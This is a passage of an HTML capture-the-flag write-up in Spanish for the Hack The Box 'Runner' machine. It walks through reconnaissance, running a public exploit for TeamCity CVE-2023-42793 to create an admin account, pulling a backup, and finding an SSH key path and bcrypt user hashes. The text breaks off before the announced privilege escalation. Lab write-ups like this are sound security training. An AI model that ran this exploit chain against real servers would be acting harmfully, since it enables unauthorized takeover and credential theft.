@@ -1,0 +1,681 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Runner - Medium - Hacktivo.io</title>
+<meta name="description" content="Hola a todos, hoy les presentaré la resolución de una máquina Hack the box de dificultad Media. En esta máquina aprenderemos a explotar una vulnerabilidad en TeamCity 2023.05.3 para posteriormente conectarnos por SSH y llegar a ser root aprovechando una versión obsoleta de runC (versión 1.1.7).">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacktivo.io">
+<meta property="og:title" content="Runner - Medium">
+<meta property="og:url" content="http://localhost:4000/runner-medium/">
+
+
+  <meta property="og:description" content="Hola a todos, hoy les presentaré la resolución de una máquina Hack the box de dificultad Media. En esta máquina aprenderemos a explotar una vulnerabilidad en TeamCity 2023.05.3 para posteriormente conectarnos por SSH y llegar a ser root aprovechando una versión obsoleta de runC (versión 1.1.7).">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/2024-08-07-runner-medium/Runner.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2024-08-13T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/runner-medium/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "0x832",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacktivo.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/0x832.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Runner - Medium</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="0x832" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">0x832</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentesting y programación
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/0x832" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Runner - Medium">
+    <meta itemprop="description" content="Hola a todos, hoy les presentaré la resolución de una máquina Hack the box de dificultad Media. En esta máquina aprenderemos a explotar una vulnerabilidad en TeamCity 2023.05.3 para posteriormente conectarnos por SSH y llegar a ser root aprovechando una versión obsoleta de runC (versión 1.1.7).">
+    <meta itemprop="datePublished" content="August 13, 2024">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Runner - Medium
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-08-13T00:00:00+02:00">August 13, 2024 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/2024-08-07-runner-medium/Runner.png" alt="" /></p>
+
+<p>Hola a todos, hoy les presentaré la resolución de una máquina <strong>Hack the box de dificultad Media</strong>. En esta máquina aprenderemos a explotar una vulnerabilidad en <strong>TeamCity 2023.05.3</strong> para posteriormente conectarnos por <strong>SSH</strong> y llegar a ser <strong>root aprovechando una versión obsoleta de runC (versión 1.1.7).</strong></p>
+
+<p><br /></p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+<ul>
+  <li>
+    <p>Enumeración con nmap
+  Hacemos un <code class="language-plaintext highlighter-rouge">nmap</code> simple para ver los puertos que corren en la máquina</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1"># nmap -p- -sS --min-rate 5000 -T5 -Pn -vvv -oN nmap.txt 10.10.11.13
+</span>  <span class="n">Increasing</span> <span class="n">send</span> <span class="n">delay</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.13</span> <span class="k">from</span> <span class="mi">0</span> <span class="n">to</span> <span class="mi">5</span> <span class="n">due</span> <span class="n">to</span> <span class="mi">1097</span> <span class="n">out</span> <span class="n">of</span> <span class="mi">2741</span> <span class="n">dropped</span> <span class="n">probes</span> <span class="n">since</span> <span class="n">last</span> <span class="n">increase</span><span class="p">.</span>
+  <span class="nb">Warning</span><span class="p">:</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.13</span> <span class="n">giving</span> <span class="n">up</span> <span class="n">on</span> <span class="n">port</span> <span class="n">because</span> <span class="n">retransmission</span> <span class="n">cap</span> <span class="n">hit</span> <span class="p">(</span><span class="mi">2</span><span class="p">).</span>
+  <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.13</span>
+  <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">user</span><span class="o">-</span><span class="nb">set</span> <span class="p">(</span><span class="mf">0.34</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+  <span class="n">Scanned</span> <span class="n">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">13</span> <span class="mi">22</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">19</span> <span class="n">CEST</span> <span class="k">for</span> <span class="mi">38</span><span class="n">s</span>
+  <span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65532</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+  <span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>  <span class="n">REASON</span>
+  <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>      <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+  <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+  <span class="mi">8000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span><span class="o">-</span><span class="n">alt</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span>
+    
+  <span class="n">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="k">from</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nmap</span>
+</code></pre></div>    </div>
+
+    <p>Una vez tenemos los puertos que en este caso como podemos ver es el <code class="language-plaintext highlighter-rouge">22(ssh)</code> , el <code class="language-plaintext highlighter-rouge">80(http)</code> y el <code class="language-plaintext highlighter-rouge">8000(HTTP Alternative)</code>.</p>
+
+    <p>Aplicamos un <code class="language-plaintext highlighter-rouge">nmap</code> más exhaustivo a dichos puertos</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c1"># nmap -p22,80,8000 -sVC -v -oN port.txt 10.10.11.13
+</span>  <span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.13</span>
+  <span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.54</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+    
+  <span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>     <span class="n">VERSION</span>
+  <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>         <span class="n">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="p">.</span><span class="mi">6</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+  <span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span>
+  <span class="o">|</span>   <span class="mi">256</span> <span class="mi">3</span><span class="n">e</span><span class="p">:</span><span class="n">ea</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">4</span><span class="n">b</span><span class="p">:</span><span class="n">c5</span><span class="p">:</span><span class="n">d1</span><span class="p">:</span><span class="mi">6</span><span class="n">d</span><span class="p">:</span><span class="mi">6</span><span class="n">f</span><span class="p">:</span><span class="n">e2</span><span class="p">:</span><span class="n">d4</span><span class="p">:</span><span class="n">d1</span><span class="p">:</span><span class="mi">3</span><span class="n">b</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="p">:</span><span class="mi">3</span><span class="n">d</span><span class="p">:</span><span class="n">a9</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+  <span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">64</span><span class="p">:</span><span class="n">cc</span><span class="p">:</span><span class="mi">75</span><span class="p">:</span><span class="n">de</span><span class="p">:</span><span class="mi">4</span><span class="n">a</span><span class="p">:</span><span class="n">e6</span><span class="p">:</span><span class="n">a5</span><span class="p">:</span><span class="n">b4</span><span class="p">:</span><span class="mi">73</span><span class="p">:</span><span class="n">eb</span><span class="p">:</span><span class="mi">3</span><span class="n">f</span><span class="p">:</span><span class="mi">1</span><span class="n">b</span><span class="p">:</span><span class="n">cf</span><span class="p">:</span><span class="n">b4</span><span class="p">:</span><span class="n">e3</span><span class="p">:</span><span class="mi">94</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+  <span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>        <span class="n">nginx</span> <span class="mf">1.18</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+  <span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span>
+  <span class="o">|</span><span class="n">_</span>  <span class="n">Supported</span> <span class="n">Methods</span><span class="p">:</span> <span class="n">GET</span> <span class="n">HEAD</span> <span class="n">POST</span> <span class="n">OPTIONS</span>
+  <span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">runner</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span>
+  <span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="p">.</span><span class="mi">0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+  <span class="mi">8000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">nagios</span><span class="o">-</span><span class="n">nsca</span> <span class="n">Nagios</span> <span class="n">NSCA</span>
+  <span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="s">'t have a title (text/plain; charset=utf-8).
+  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+    
+  Read data files from: /usr/bin/../share/nmap
+</span></code></pre></div>    </div>
+
+    <p>Podemos ver que se aplica un <code class="language-plaintext highlighter-rouge">follow redirecta</code> <strong>http://runner.htb/ así que lo añadiremos al <code class="language-plaintext highlighter-rouge">/etc/hosts</code></strong></p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.13</span> <span class="n">runner</span><span class="p">.</span><span class="n">htb</span>
+</code></pre></div>    </div>
+
+    <h1 id="ahora-accedemos-a-la-web-para-poder-determinar-que-clase-de-vulnerabilidades-podemos-encontrar">Ahora accedemos a la web para poder determinar que clase de vulnerabilidades podemos encontrar</h1>
+
+    <p>Accedemos a la web por el puerto 80 encontramos esto, si miramos en <code class="language-plaintext highlighter-rouge">Home, About, Service</code> no hay nada interesante</p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image.png" alt="image.png" /></p>
+
+    <p>Si intentamos mirar por <code class="language-plaintext highlighter-rouge">'subdominios o rutas</code>’ no encontramos anda así que aplicaremos este comando de aquí.</p>
+
+    <p>Lo que hará este comando será crear una lista de palabras personalizada a partir del contenido de una página web</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">cewl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">runner</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">v</span> <span class="n">CeWL</span> <span class="o">&gt;</span> <span class="n">words_runner</span><span class="p">.</span><span class="n">tx</span>
+</code></pre></div>    </div>
+
+    <p>Una vez creada la <code class="language-plaintext highlighter-rouge">wordlist</code> de palabras, podemos intentar escanear <code class="language-plaintext highlighter-rouge">subdominios</code> con esta lista y encontramos <code class="language-plaintext highlighter-rouge">TeamCity.runner.htb</code></p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">gobuster</span> <span class="n">vhost</span> <span class="o">-</span><span class="n">w</span> <span class="n">words_runner</span><span class="p">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">runner</span><span class="p">.</span><span class="n">htb</span> <span class="o">-</span><span class="n">H</span> <span class="s">"hosts: FUZZ.runnter.htb"</span> <span class="o">--</span><span class="n">append</span><span class="o">-</span><span class="n">domain</span>
+  <span class="o">===============================================================</span>
+  <span class="n">Gobuster</span> <span class="n">v3</span><span class="p">.</span><span class="mi">6</span>
+  <span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="o">@</span><span class="n">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="o">@</span><span class="n">firefart</span><span class="p">)</span>
+  <span class="o">===============================================================</span>
+  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Url</span><span class="p">:</span>             <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">runner</span><span class="p">.</span><span class="n">htb</span>
+  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Method</span><span class="p">:</span>          <span class="n">GET</span>
+  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Threads</span><span class="p">:</span>         <span class="mi">10</span>
+  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Wordlist</span><span class="p">:</span>        <span class="n">words_runner</span><span class="p">.</span><span class="n">txt</span>
+  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="p">:</span>      <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.6</span>
+  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Timeout</span><span class="p">:</span>         <span class="mi">10</span><span class="n">s</span>
+  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Append</span> <span class="n">Domain</span><span class="p">:</span>   <span class="n">true</span>
+  <span class="o">===============================================================</span>
+  <span class="n">Starting</span> <span class="n">gobuster</span> <span class="ow">in</span> <span class="n">VHOST</span> <span class="n">enumeration</span> <span class="n">mode</span>
+  <span class="o">===============================================================</span>
+  <span class="n">Found</span><span class="p">:</span> <span class="n">TeamCity</span><span class="p">.</span><span class="n">runner</span><span class="p">.</span><span class="n">htb</span> <span class="n">Status</span><span class="p">:</span> <span class="mi">401</span> <span class="p">[</span><span class="n">Size</span><span class="p">:</span> <span class="mi">66</span><span class="p">]</span>
+  <span class="n">Progress</span><span class="p">:</span> <span class="mi">285</span> <span class="o">/</span> <span class="mi">286</span> <span class="p">(</span><span class="mf">99.65</span><span class="o">%</span><span class="p">)</span>
+  <span class="o">===============================================================</span>
+  <span class="n">Finished</span>
+  <span class="o">===============================================================</span>
+</code></pre></div>    </div>
+
+    <p>Añadiremos <code class="language-plaintext highlighter-rouge">TeamCity.runner.htb</code> a nuestro <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mf">10.10</span><span class="p">.</span><span class="mf">11.13</span> <span class="n">runner</span><span class="p">.</span><span class="n">htb</span> <span class="n">TeamCity</span><span class="p">.</span><span class="n">runner</span><span class="p">.</span><span class="n">htb</span>
+</code></pre></div>    </div>
+
+    <p>Si ahora vamos al navegador y ponemos el subdominio encontrado anteriormente ,encontraremos este <code class="language-plaintext highlighter-rouge">login</code> , pero nos llama la atención la versión de <code class="language-plaintext highlighter-rouge">TeamCity v2023.05.3</code></p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image%201.png" alt="image.png" /></p>
+
+    <p>Si buscamos en <code class="language-plaintext highlighter-rouge">searchsploit</code> encontramos que es vulnerable</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="n">searchsploit</span> <span class="n">TeamCity</span> <span class="mf">2023.05</span><span class="p">.</span><span class="mi">3</span>
+  <span class="o">------------------------------------------------------------------------------------------------------------------------------------</span> <span class="o">---------------------------------</span>
+   <span class="n">Exploit</span> <span class="n">Title</span>                                                                                                                      <span class="o">|</span>  <span class="n">Path</span>
+  <span class="o">------------------------------------------------------------------------------------------------------------------------------------</span> <span class="o">---------------------------------</span>
+  <span class="n">JetBrains</span> <span class="n">TeamCity</span> <span class="mf">2023.05</span><span class="p">.</span><span class="mi">3</span> <span class="o">-</span> <span class="n">Remote</span> <span class="n">Code</span> <span class="n">Execution</span> <span class="p">(</span><span class="n">RCE</span><span class="p">)</span>                                                                          <span class="o">|</span> <span class="n">java</span><span class="o">/</span><span class="n">remote</span><span class="o">/</span><span class="mf">51884.</span><span class="n">py</span>
+  <span class="o">------------------------------------------------------------------------------------------------------------------------------------</span> <span class="o">---------------------------------</span>
+</code></pre></div>    </div>
+
+    <p>Así que nos descargaremos el <code class="language-plaintext highlighter-rouge">exploit</code></p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">searchsploit</span> <span class="n">TeamCity</span> <span class="mf">2023.05</span><span class="p">.</span><span class="mi">3</span> <span class="o">-</span><span class="n">m</span> <span class="n">java</span><span class="o">/</span><span class="n">remote</span><span class="o">/</span><span class="mf">51884.</span><span class="n">py</span>
+</code></pre></div>    </div>
+
+    <h1 id="explotación-de-teamcity-2023053">Explotación de TeamCity 2023.05.3</h1>
+
+    <p>Ejecutamos el <code class="language-plaintext highlighter-rouge">exploit</code> y nos da un usuario y <code class="language-plaintext highlighter-rouge">password</code></p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">python3</span> <span class="mf">51884.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">teamcity</span><span class="p">.</span><span class="n">runner</span><span class="p">.</span><span class="n">htb</span>
+    
+  <span class="o">=====================================================</span>
+  <span class="o">*</span>       <span class="n">CVE</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">42793</span>                              <span class="o">*</span>
+  <span class="o">*</span>  <span class="n">TeamCity</span> <span class="n">Admin</span> <span class="n">Account</span> <span class="n">Creation</span>                  <span class="o">*</span>
+  <span class="o">*</span>                                                   <span class="o">*</span>
+  <span class="o">*</span>  <span class="n">Author</span><span class="p">:</span> <span class="n">ByteHunter</span>                               <span class="o">*</span>
+  <span class="o">=====================================================</span>
+    
+  <span class="n">Token</span><span class="p">:</span> <span class="n">eyJ0eXAiOiAiVENWMiJ9</span><span class="p">.</span><span class="n">T3RudmdKTVdZT29nZkp4MndSdlBwanZfVmRF</span><span class="p">.</span><span class="n">N2VhMDk0ZjktMGM2MS00OWE1LTkyZGQtZDllMmJhMjFiNTU1</span>
+  <span class="n">Successfully</span> <span class="n">exploited</span><span class="err">!</span>
+  <span class="n">URL</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">teamcity</span><span class="p">.</span><span class="n">runner</span><span class="p">.</span><span class="n">htb</span>
+  <span class="n">Username</span><span class="p">:</span> <span class="n">city_admind2GF</span>
+  <span class="n">Password</span><span class="p">:</span> <span class="n">Main_password</span><span class="err">!!</span><span class="o">**</span>
+</code></pre></div>    </div>
+
+    <p>Una vez tenemos la <code class="language-plaintext highlighter-rouge">contraseña</code> y <code class="language-plaintext highlighter-rouge">usuario</code> podemos <strong>iniciar sesión</strong>, una vez iniciemos sesión seremos <code class="language-plaintext highlighter-rouge">admin</code> así que tenemos la capacidad de descargar <code class="language-plaintext highlighter-rouge">backup</code></p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image%202.png" alt="image.png" /></p>
+
+    <p>Nos dirigiremos <code class="language-plaintext highlighter-rouge">administración</code> y le daremos a la sección de <code class="language-plaintext highlighter-rouge">backup</code>. Una vez hecho esto le daremos al botón <code class="language-plaintext highlighter-rouge">Start Backup</code> y nos saldrá un <code class="language-plaintext highlighter-rouge">.zip</code> que nos podemos descargar</p>
+
+    <p><img src="/assets/images/2024-08-07-runner-medium/image%203.png" alt="image.png" /></p>
+
+    <p>Una vez descargado , <code class="language-plaintext highlighter-rouge">unzipearemos</code> el <code class="language-plaintext highlighter-rouge">.zip</code> para poder ver que encontramos en ese <code class="language-plaintext highlighter-rouge">backup</code>.</p>
+
+    <p>Dentro del <code class="language-plaintext highlighter-rouge">backup</code> encontramos estos</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">charset</span>  <span class="n">config</span>  <span class="n">database_dump</span>  <span class="n">export</span><span class="p">.</span><span class="n">report</span>  <span class="n">metadata</span>  <span class="n">system</span>  <span class="n">version</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>    </div>
+
+    <p>Al explorar el contenido de las carpetas, encontramos una ruta que almacena un archivo <strong><code class="language-plaintext highlighter-rouge">id_rsa</code></strong>, el cual podríamos intentar utilizar para conectarnos por <code class="language-plaintext highlighter-rouge">SSH</code>.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">config</span><span class="o">/</span><span class="n">projects</span><span class="o">/</span><span class="n">AllProjects</span><span class="o">/</span><span class="n">pluginData</span><span class="o">/</span><span class="n">ssh_keys</span>
+</code></pre></div>    </div>
+
+    <p>Pero aún nos queda saber con qué usuario nos conectaremos.
+  Nos dirigimos a la carpeta <code class="language-plaintext highlighter-rouge">database_dump</code> y encontramos un archivo llamado <code class="language-plaintext highlighter-rouge">users</code>, el cual llama bastante nuestra atención. Si usamos <code class="language-plaintext highlighter-rouge">cat</code> para ver su contenido, observamos hashes que podríamos intentar descifrar con <code class="language-plaintext highlighter-rouge">John</code></p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">ID</span><span class="p">,</span> <span class="n">USERNAME</span><span class="p">,</span> <span class="n">PASSWORD</span><span class="p">,</span> <span class="n">NAME</span><span class="p">,</span> <span class="n">EMAIL</span><span class="p">,</span> <span class="n">LAST_LOGIN_TIMESTAMP</span><span class="p">,</span> <span class="n">ALGORITHM</span>
+  <span class="mi">1</span><span class="p">,</span> <span class="n">admin</span><span class="p">,</span> <span class="err">$</span><span class="mi">2</span><span class="n">a</span><span class="err">$</span><span class="mi">07</span><span class="err">$</span><span class="n">neV5T</span><span class="o">/</span><span class="n">BlEDiMQUs</span><span class="p">.</span><span class="n">gM1p4uYl8xl8kvNUo4</span><span class="o">/</span><span class="mi">8</span><span class="n">Aja2sAWHAQLWqufye</span><span class="p">,</span> <span class="n">John</span><span class="p">,</span> <span class="n">john</span><span class="o">@</span><span class="n">runner</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span> <span class="mi">1723754735147</span><span class="p">,</span> <span class="n">BCRYPT</span>
+  <span class="mi">2</span><span class="p">,</span> <span class="n">matthew</span><span class="p">,</span> <span class="err">$</span><span class="mi">2</span><span class="n">a</span><span class="err">$</span><span class="mi">07</span><span class="err">$</span><span class="n">q</span><span class="p">.</span><span class="n">m8WQP8niXODv55lJVovOmxGtg6K</span><span class="o">/</span><span class="n">YPHbD48</span><span class="o">/</span><span class="n">JQsdGLulmeVo</span><span class="p">.</span><span class="n">Em</span><span class="p">,</span> <span class="n">Matthew</span><span class="p">,</span> <span class="n">matthew</span><span class="o">@</span><span class="n">runner</span><span class="p">.</span><span class="n">htb</span><span class="p">,</span> <span class="mi">1709150421438</span><span class="p">,</span> <span class="n">BCRYPT</span>
+  <span class="mi">11</span><span class="p">,</span> <span class="n">admin</span><span class="p">.</span><span class="mi">03</span><span class="n">tq</span><span class="p">,</span> <span class="err">$</span><span class="mi">2</span><span class="n">a</span><span class="err">$</span><span class="mi">07</span><span class="err">$</span><span class="n">ssCrJlQub3j6JilRvlqtbOVQuzhwxRPcuWNOylHgTr1q7APg727RK</span><span class="p">,</span> <span class="p">,</span> <span class="n">admin</span><span class="p">.</span><span class="mi">03</span><span class="n">tQ</span><span class="o">@</span><span class="n">lol</span><span class="p">.</span><span class="n">omg</span><span class="p">,</span> <span class="mi">1723753919282</span><span class="p">,</span> <span class="n">BCRYPT</span>
